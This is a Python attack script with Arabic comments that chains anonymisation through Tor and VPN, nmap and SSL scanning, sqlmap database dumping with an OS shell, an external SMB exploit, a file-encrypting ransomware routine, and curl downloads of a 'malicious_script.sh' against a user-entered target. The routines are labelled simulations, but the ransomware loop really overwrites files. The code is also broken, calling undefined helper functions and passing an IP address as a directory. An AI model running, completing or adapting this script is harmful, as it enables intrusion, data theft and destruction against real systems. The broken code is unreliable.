import os
import socket
import subprocess
import requests
import logging
import random
import string
import base64
import hashlib
import re
import threading
import json
import platform
import urllib.request
import argparse
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import socks
import ssl
from nmap import PortScanner
from impacket import smb
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pyautogui
import pyaudio
import wave
import shutil
import cv2
from onvif import ONVIFCamera
import matplotlib.pyplot as plt
import sqlite3
import asyncio

# ========================
# إعدادات السجل
# ========================
LOG_FILE = 'ultimate_cyber_tool_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ========================
# وظائف المساعدة العامة
# ========================
def request_permission(tool_name, description):
    """
    طلب إذن المستخدم لتشغيل أداة معينة.
    """
    print(f"[INFO] {tool_name}: {description}")
    choice = input(f"[?] Do you want to proceed with {tool_name}? (y/n): ").strip().lower()
    return choice == 'y'

def is_ip_address(target):
    """
    التحقق إذا كان الهدف عنوان IP.
    """
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, target))

def resolve_url_to_ip(url):
    """
    تحويل URL إلى عنوان IP.
    """
    try:
        ip = socket.gethostbyname(url)
        logging.info(f"Resolved {url} to IP {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve {url} to IP: {e}")
        return None

def save_to_logfile(content, filename="tool_output.log"):
    """
    حفظ نتائج الأداة إلى ملف.
    """
    try:
        with open(filename, "a") as file:
            file.write(content + "\n")
        logging.info(f"Output saved to {filename}")
    except Exception as e:
        logging.error(f"Failed to save output to {filename}: {e}")

# ========================
# وظائف التخفي
# ========================
def configure_stealth_mode():
    """
    إعداد بيئة التخفي باستخدام Tor و VPN.
    """
    try:
        logging.info("Configuring stealth mode...")
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        subprocess.run(["openvpn", "--config", "vpn_config.ovpn"], shell=True)
        logging.info("Stealth mode configured.")
    except Exception as e:
        logging.error(f"Stealth mode configuration failed: {e}")

# ========================
# وظائف الكشف
# ========================
def run_testssl(target):
    """
    تشغيل TestSSL للكشف عن ثغرات SSL.
    """
    if not request_permission("TestSSL", "Check SSL vulnerabilities?"):
        return
    try:
        command = [
            "./testssl.sh", "--vulnerable", "--severity", "HIGH", "--full", "--sneaky",
            "--show-each", "--wide", "--color", "3", "--json-pretty", "--html",
            "--logfile", "deep_scan_result.log", "--assume-http", "--ids-friendly",
            "--debug", "6", "--openssl", "/usr/bin/openssl", "--connect-timeout", "5",
            "--openssl-timeout", "5", target
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"TestSSL failed: {e}")

def run_nmap(target):
    """
    تشغيل Nmap باستخدام الخيارات المحددة.
    إذا كان الهدف URL سيتم تحويله إلى IP أولاً.
    """
    if not request_permission("Nmap", "Run Nmap to scan the target?"):
        return
    try:
        # التحقق من إذا كان الهدف عنوان URL وتحويره إلى IP
        if not is_ip_address(target):
            target_ip = resolve_url_to_ip(target)
            if target_ip is None:
                return  # إلغاء الفحص إذا فشل تحويل الـ URL إلى IP
        else:
            target_ip = target
        
        logging.info(f"Running Nmap on {target_ip}...")
        command = [
            "nmap", "-sS", "-sU", "-T4", "-A", "-v", target_ip
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"Nmap failed: {e}")

# ========================
# وظائف الهجمات
# ========================
def run_sqlmap(target):
    """
    تشغيل SQLMap لاستغلال ثغرات SQL Injection.
    """
    try:
        subprocess.run([ 
            "sqlmap", "-u", f"{target}?id=1 OR 1=1", "--batch", "--level=5", "--risk=3",
            "--tamper=space2comment,charencode,randomcase,between", "--random-agent",
            "--crawl=10", "--threads=10", "--technique=BEUSTQ", "--time-sec=10",
            "--output-dir=sqlmap_output", "--dbs", "--dump-all", "--forms", "--smart", "--os-shell"
        ])
    except Exception as e:
        logging.error(f"SQLMap failed: {e}")

def exploit_smb(target_ip):
    """
    استغلال SMB (مثل EternalBlue).
    """
    if not request_permission("SMB Exploit", f"Attempt SMB exploitation on {target_ip}?"):
        return
    try:
        logging.info(f"Exploiting SMB on {target_ip}...")
        smb_exploit_script = "path/to/smb_exploit.py"
        subprocess.run(["python3", smb_exploit_script, target_ip])
    except Exception as e:
        logging.error(f"SMB exploit failed: {e}")

def deploy_ransomware(target_directory):
    """
    تنفيذ برمجية فدية (محاكاة).
    """
    if not request_permission("Ransomware", "Deploy ransomware on the target?"):
        return
    try:
        logging.info("Deploying ransomware...")
        key, salt = generate_aes_key()
        for root, _, files in os.walk(target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                with open(filepath, "rb") as f:
                    encrypted_data = encrypt_data(f.read().decode(errors="ignore"), key)
                with open(filepath, "wb") as f:
                    f.write(encrypted_data)
        logging.info("Ransomware deployed successfully.")
    except Exception as e:
        logging.error(f"Ransomware deployment failed: {e}")

def deploy_spyeyebotnet(target_ip):
    """
    نشر SpyEye Botnet (محاكاة).
    """
    if not request_permission("SpyEyeBotnet", f"Deploy SpyEye Botnet on {target_ip}?"):
        return
    try:
        logging.info(f"Deploying SpyEye Botnet on {target_ip}...")
        subprocess.run(["curl", f"http://{target_ip}/malicious_script.sh", "-O"])  # مثال لتحميل سكربت ضار
        logging.info("SpyEye Botnet deployed successfully.")
    except Exception as e:
        logging.error(f"SpyEye Botnet deployment failed: {e}")

def deploy_malware(target_ip):
    """
    نشر البرامج الضارة (محاكاة).
    """
    if not request_permission("Deploy Malware", f"Deploy malware on {target_ip}?"):
        return
    try:
        logging.info(f"Deploying malware on {target_ip}...")
        subprocess.run(["curl", f"http://{target_ip}/malicious_script.sh", "-O"])  # مثال لتحميل سكربت ضار
        logging.info("Malware deployed successfully.")
    except Exception as e:
        logging.error(f"Malware deployment failed: {e}")

# ========================
# وظائف التحليل المتقدمة
# ========================
def generate_report(data, filename="report.png"):
    """
    توليد تقرير رسومي باستخدام matplotlib.
    """
    labels = ['Category 1', 'Category 2', 'Category 3']
    generate_bar_chart([5, 10, 3], labels, filename)
    logging.info(f"Generated report: {filename}")

def generate_bar_chart(data, labels, filename="report.png"):
    plt.bar(labels, data)
    plt.xlabel('Categories')
    plt.ylabel('Counts')
    plt.title('Analysis Results')
    plt.savefig(filename)
    logging.info(f"Report saved to {filename}")

# ========================
# أتمتة التقارير
# ========================
def send_email_report(recipient, subject, body, attachment=None):
    """
    إرسال التقرير بالبريد الإلكتروني.
    """
    try:
        msg = MIMEMultipart()
        msg['From'] = "your_email@example.com"
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachment:
            with open(attachment, "rb") as file:
                msg.attach(MIMEText(file.read(), 'base64', 'png'))
                msg.add_header('Content-Disposition', 'attachment', filename=attachment)

        with smtplib.SMTP('smtp.example.com') as server:
            server.login('your_email@example.com', 'your_password')
            server.sendmail(msg['From'], msg['To'], msg.as_string())
        logging.info(f"Report sent to {recipient}")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# ========================
# وظيفة main 
# ========================
def main():
    """
    الوظيفة الرئيسية لدمج الأدوات في سكربت شامل.
    """
    # التحليل والتفاعل
    target = input("Enter target (IP or URL): ").strip()
    if not target:
        logging.error("No target specified.")
        return

    # تشغيل الأدوات
    configure_stealth_mode()
    run_nmap(target)
    run_testssl(target)
    run_sqlmap(target)
    exploit_smb(target)
    deploy_ransomware(target)
    deploy_spyeyebotnet(target)
    deploy_malware(target)

    # توليد التقارير
    generate_report([5, 10, 3], ['Category 1', 'Category 2', 'Category 3'])
    send_email_report("recipient@example.com", "Cyber Attack Report", "Details of the attack.", "report.png")

if __name__ == "__main__":
    main()
